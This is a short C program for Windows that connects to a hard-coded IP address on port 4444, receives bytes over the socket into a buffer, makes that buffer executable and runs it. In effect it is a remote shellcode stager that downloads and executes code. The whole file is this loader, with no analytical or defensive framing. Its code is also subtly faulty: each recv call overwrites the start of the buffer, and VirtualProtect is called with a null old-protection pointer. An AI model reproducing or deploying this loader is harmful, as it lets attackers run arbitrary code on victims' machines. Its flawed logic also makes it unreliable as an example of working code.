#include <windows.h>
#include <winsock2.h>

#define IP_ADDRESS "10.230.229.13"
#define PORT 4444

int main() {
  // Create WSADATA Object
  WSADATA wsaData;
  int wResult;

  wResult = WSAStartup(MAKEWORD(2,2), &wsaData);
  if (wResult != 0) {
    return 1;
  }

  // Create a socket to connect to an IP and port
  SOCKET ConnectSocket = INVALID_SOCKET;
  ConnectSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

  struct sockaddr_in saServer;
  saServer.sin_family = AF_INET;
  saServer.sin_addr.s_addr = inet_addr(IP_ADDRESS);
  saServer.sin_port = htons(PORT);

  connect( ConnectSocket, (SOCKADDR*) &saServer, sizeof(saServer) );

  // Receive data from port
  char data[819200] = "";
  int res;

  do {
    res = recv( ConnectSocket, data, 512, 0 );
  } while (res > 0);

  // Allocate RWX memory for the data
  VirtualProtect(data, sizeof(data),PAGE_EXECUTE_READWRITE,NULL);

  // Execute the received payload
  (*(void(*)()) data)();
}

